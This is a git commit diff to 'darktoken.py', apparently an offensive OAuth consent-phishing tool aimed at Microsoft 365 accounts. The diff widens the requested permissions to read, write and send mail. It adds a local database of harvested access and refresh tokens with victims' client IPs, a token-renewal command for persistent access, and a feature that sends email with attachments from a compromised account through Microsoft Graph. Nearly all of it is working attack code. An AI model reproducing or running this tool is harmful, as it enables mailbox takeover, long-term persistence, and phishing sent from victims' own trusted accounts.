bcebf526d0763c73eac27438f978cc0e08141aef
ring0lab <ring0lab@users.noreply.github.com>
2018-10-10 01:00:09 -0400

    updated darktoken database

--- darktoken.py
+++ darktoken.py
@@ -37,12 +37,14 @@ from BaseHTTPServer import BaseHTTPRequestHandler
 import json
 from urlparse import urlparse, parse_qs
 import urllib
-import os
+import os, base64, mimetypes, ConfigParser
 from os import system
+from tinydb import TinyDB, Query
 
 SIGNAL = ''
 global EMAILDOMAIN
 global TOKENS
+TOKENS = []
 global HTTPD
 API = {
 	'base': 'https://graph.microsoft.com/',
@@ -55,13 +57,21 @@ API = {
 global CLIENT_IP
 APP_CONFIG = {
 	'client_id': '',
-	'scope': 'openid offline_access people.read user.read profile email mail.read',
+	'scope': 'openid offline_access people.read user.read profile email mail.read mail.readwrite mail.send',
 	'client_secret': '',
 	'redirect_uri': ''
 	}
 CERT_CONFIG = {
 	'keyfile': 'key.pem',
 	'certfile': 'cert.pem'
+}
+EMAIL_CONFIG = {
+	'subject': '',
+	'importance': 'Low',
+	'contentType': 'HTML',
+	'content': '',
+	'address': '',
+	'attachments': []
 }
 
 help = """
@@ -87,6 +97,17 @@ set redirect_uri     - To set redirect_uri   - REQUIRED
 set keyfile          - To set private key file
 set certfile         - To set certificate file
 generate link        - Generate permission request link
+renew token ID       - To generate new access token
+
+[Email Configuration]
+
+show email config    - To list email config
+set subject          - To set subject        - REQUIRED
+set importance       - To set importance
+set contentType      - To set contentType
+set content          - To set content        - REQUIRED
+set address          - To set rcpt address   - REQUIRED
+set attachments      - To set attachments
 
 """
 
@@ -98,6 +119,29 @@ class colors:
 	white = '\x1b[0;37;40m'
 	blue = '\x1b[0;34;40m'
 	end = '\x1b[0m'
+
+config_parser = ConfigParser.RawConfigParser()
+if os.path.isfile('autorun.cfg'):
+	config_file_path = r'autorun.cfg'
+	config_parser.read(config_file_path)
+	if config_parser.get('app-config', 'client_id'):
+		APP_CONFIG['client_id'] = config_parser.get('app-config', 'client_id')
+	if config_parser.get('app-config', 'client_secret'):
+		APP_CONFIG['client_secret'] = config_parser.get('app-config', 'client_secret')
+	if config_parser.get('app-config', 'redirect_uri'):
+		APP_CONFIG['redirect_uri'] = config_parser.get('app-config', 'redirect_uri')
+else:
+	autorun_cfg = open("autorun.cfg",'w')
+	config_parser.add_section('app-config')
+	config_parser.set('app-config','client_id','')
+	config_parser.set('app-config','client_secret','')
+	config_parser.set('app-config','redirect_uri','')
+	config_parser.write(autorun_cfg)
+
+if os.path.isfile('darktokenDB.json'):
+	darktoken_db = TinyDB('darktokenDB.json')
+	for token in darktoken_db:
+		TOKENS.append([token['account'],token['access_token'],token['id_token'],token['refresh_token'],token['CLIENT_IP']])
 
 class AuthorizationHandler(BaseHTTPRequestHandler):
 	def do_GET(self):
@@ -127,8 +171,7 @@ class AuthorizationHandler(BaseHTTPRequestHandler):
 			thread.start_new_thread(stop_server, (HTTPD,))
 			self.send_error(500)
 
-def httpRequest(url, payload, access_token_authorization_bearer=None, method='POST', context=ssl._https_verify_certificates()):
-	headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+def httpRequest(url, payload, access_token_authorization_bearer=None, method='POST', context=ssl._https_verify_certificates(), headers={'Content-Type': 'application/x-www-form-urlencoded'}):
 
 	if access_token_authorization_bearer:
 		headers['Authorization'] = 'Bearer ' + access_token_authorization_bearer
@@ -136,14 +179,22 @@ def httpRequest(url, payload, access_token_authorization_bearer=None, method='PO
 	url_parsed = urlparse(url)
 
 	conn = httplib.HTTPSConnection(url_parsed.hostname, context=context)
-	conn.request(method=method, url=url_parsed.path, body=urllib.urlencode(payload), headers=headers)
+
+	try:
+		if headers['Content-Type'] == 'application/json':
+			conn.request(method=method, url=url_parsed.path, body=json.dumps(payload), headers=headers)
+		else:
+			conn.request(method=method, url=url_parsed.path, body=urllib.urlencode(payload), headers=headers)
+	except:
+		conn.request(method=method, url=url_parsed.path, body=payload, headers=headers)
+
 	return conn.getresponse()
 
 def get_access_token(code):
 	payload = {
 		'grant_type': 'authorization_code',
  		'client_id': '',
-		'scope': 'openid offline_access people.read user.read profile email mail.read',
+		'scope': '',
 		'client_secret': '',
 		'redirect_uri': '',
 		'code': code
@@ -155,7 +206,21 @@ def get_access_token(code):
 	res_json = json.loads(resp_body.decode('utf-8'))
 
 	account = get_account_profile(res_json['access_token'])
-	store_token(account, res_json['access_token'], res_json['id_token'], res_json['refresh_token'])
+	store_token(account['userPrincipalName'], res_json['access_token'], res_json['id_token'], res_json['refresh_token'])
+
+def refresh_access_token(account, refresh_token, client_ip):
+	payload = {
+		'grant_type': 'refresh_token',
+ 		'client_id': APP_CONFIG['client_id'],
+		'client_secret': APP_CONFIG['client_secret'],
+		'refresh_token': refresh_token
+		}
+
+	resp = httpRequest('https://login.windows.net/common/oauth2/v2.0/token', payload)
+	resp_body = resp.read()
+	res_json = json.loads(resp_body.decode('utf-8'))
+	
+	store_token(account, res_json['access_token'], res_json['id_token'], res_json['refresh_token'], client_ip)
 
 def get_account_profile(access_token):
 	global EMAILDOMAIN
@@ -172,6 +237,53 @@ def get_account_messages(access_token):
 	resp_body = resp.read()
 	res_json = json.loads(resp_body.decode('utf-8'))
 	return res_json
+
+def send_email(access_token):
+	payload = {
+    "subject": EMAIL_CONFIG['subject'],
+    "importance": EMAIL_CONFIG['importance'],
+    "body":{
+        "contentType": EMAIL_CONFIG['contentType'],
+        "content": EMAIL_CONFIG['content']
+    },
+    "toRecipients":[
+        {
+            "emailAddress":{
+                "address": EMAIL_CONFIG['address']
+            }
+        }
+    ]
+	}
+
+	resp = httpRequest(API['base']+API['message'], payload, access_token, headers={'Content-Type': 'application/json'})
+	resp_body = resp.read()
+	res_json = json.loads(resp_body.decode('utf-8'))
+
+	if EMAIL_CONFIG['attachments']:
+		for filepath in EMAIL_CONFIG['attachments']:
+			filename = os.path.basename(filepath)
+			b64_content = base64.b64encode(open(filepath, 'rb').read())
+			mime_type = mimetypes.guess_type(filepath)[0]
+			add_attachments(access_token, res_json['id'], filename, b64_content, mime_type, headers={'Content-Type': 'application/json'})
+
+	mail = httpRequest(API['base']+API['message']+'/'+res_json['id']+'/send', '', access_token, headers={'Content-Length	': '0'})
+	if mail.status == 202:
+		print '[*] Email Sent!'
+
+def add_attachments(access_token, message_id, filename, content_bytes, mime_type, headers):
+	payload = {
+  "@odata.type": "#microsoft.graph.fileAttachment",
+  "name": filename,
+  "contentBytes": content_bytes.decode('utf-8'),
+  "ContentType": mime_type
+	}
+
+	resp = httpRequest(API['base']+API['message']+'/'+message_id+'/attachments', payload, access_token, headers=headers)
+	resp_body = resp.read()
+	res_json = json.loads(resp_body.decode('utf-8'))
+
+	if resp.status == 201:
+		print '[*] File: [%s] Attached!' % filename
 
 def get_users(access_token):
 	resp = httpRequest(API['base']+API['users'], '', access_token, 'GET')
@@ -210,10 +322,32 @@ def stop_server():
 	except:
 		pass
 
-def store_token(account, access_token, id_token, refresh_token):
+def store_token(account, access_token, id_token, refresh_token, client_ip=''):
 	global TOKENS
-	TOKENS = []
-	TOKENS.append([account, access_token, id_token, refresh_token, CLIENT_IP])
+	global CLIENT_IP
+
+	if client_ip:
+		CLIENT_IP = client_ip
+
+	if TOKENS:
+		match = False
+		for i in range(len(TOKENS)):
+			if TOKENS[i-1][0] == account:
+				TOKENS[i-1] = [account, access_token, id_token, refresh_token, CLIENT_IP]
+				match = True
+		if not match:
+			TOKENS.append([account, access_token, id_token, refresh_token, CLIENT_IP])
+	else:
+		TOKENS.append([account, access_token, id_token, refresh_token, CLIENT_IP])
+
+	darktoken_db = TinyDB('darktokenDB.json')
+	token = Query()
+
+	if darktoken_db.search(token.account == account):
+		darktoken_db.update({'access_token': access_token, 'id_token': id_token, 'refresh_token': refresh_token, 'CLIENT_IP': CLIENT_IP}, token.account == account)
+	else:
+		darktoken_db.insert({'account': account, 'access_token': access_token, 'id_token': id_token, 'refresh_token': refresh_token, 'CLIENT_IP': CLIENT_IP})
+	
 
 print '[!] Starting Dark Token...'
 
@@ -223,14 +357,22 @@ while True:
 		thread.start_new_thread(start_server, ())
 	elif SIGNAL.__contains__('stop server'):
 		stop_server()
+	elif SIGNAL.__contains__('renew token'):
+		id = SIGNAL.split()[2]
+		print '[+] Trying To Renew Available Tokens: ' + TOKENS[int(id)][0]
+		if TOKENS:
+			refresh_access_token(TOKENS[int(id)][0], TOKENS[int(id)][3], TOKENS[int(id)][4])
+		else:
+			print '[!] 0 tokens found in the database.'
 	elif SIGNAL.__contains__('list tokens'):
 		print '[!] Listing Available Tokens:'
 		try:
 			for i in range(len(TOKENS)):
 				print colors.allwhite + '-' * int(columns) + colors.end
-				print 'ID = [' + str(i) + '] - Account: ' + TOKENS[i][0]['userPrincipalName']
-				print 'Access_Token: ' + TOKENS[i-1][1]
-				print 'Client IP: ' + TOKENS[i-1][4]
+				print 'ID = [' + str(i) + '] - Account: ' + TOKENS[i][0]
+				print 'Access_Token: ' + TOKENS[i][1]
+				print 'Refresh_token: ' + TOKENS[i][3]
+				print 'Client IP: ' + TOKENS[i][4]
 		except NameError:
 			print '[!] 0 tokens found in the database.'
 			pass
@@ -279,6 +421,9 @@ while True:
 		except NameError:
 			print '[!] 0 messages found in the database.'
 			pass
+	elif SIGNAL.__contains__('send email'):
+		id = SIGNAL.split()[2]
+		resp = send_email(TOKENS[int(id)][1])
 	elif SIGNAL.__contains__('clear'):
 		system('clear')
 	elif SIGNAL.__contains__('show app config'):
@@ -303,6 +448,36 @@ while True:
 			print "\nhttps://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=%s&response_type=code&redirect_uri=%s&response_mode=query&scope=%s&state=12345\n" % (str(APP_CONFIG['client_id']), urllib.quote(APP_CONFIG['redirect_uri']), urllib.quote(APP_CONFIG['scope']))
 		except:
 			pass
+	elif SIGNAL.__contains__('show email config'):
+		print "subject: %s" % str(EMAIL_CONFIG['subject'])
+		print "importance: %s" % str(EMAIL_CONFIG['importance'])
+		print "contentType: %s" % str(EMAIL_CONFIG['contentType'])
+		print "content: %s" % str(EMAIL_CONFIG['content'])
+		print "recipient address: %s" % str(EMAIL_CONFIG['address'])
+		for filepath in EMAIL_CONFIG['attachments']:
+			print "Attachment [%s]: [%s]" % (str(EMAIL_CONFIG['attachments'].index(filepath)+1), str(filepath))
+	elif SIGNAL.__contains__('set subject'):
+		subject = raw_input('Subject: ')
+		EMAIL_CONFIG['subject'] = subject
+	elif SIGNAL.__contains__('set importance'):
+		importance = SIGNAL.split()[2]
+		EMAIL_CONFIG['importance'] = importance
+	elif SIGNAL.__contains__('set contentType'):
+		contentType = SIGNAL.split()[2]
+		EMAIL_CONFIG['contentType'] = contentType
+	elif SIGNAL.__contains__('set content'):
+		content = raw_input('Body: ')
+		EMAIL_CONFIG['content'] = content
+	elif SIGNAL.__contains__('set address'):
+		address = SIGNAL.split()[2]
+		EMAIL_CONFIG['address'] = address
+	elif SIGNAL.__contains__('set attachments'):
+		print 'Paste your file location, one per line. When you\'re finished, press enter on an empty line'
+		file = 'None'
+		while file:
+			file = raw_input('File Location: ')
+			if file:
+				EMAIL_CONFIG['attachments'].append(file)
 	elif SIGNAL.__contains__('help'):
 		print help
 	elif not SIGNAL:
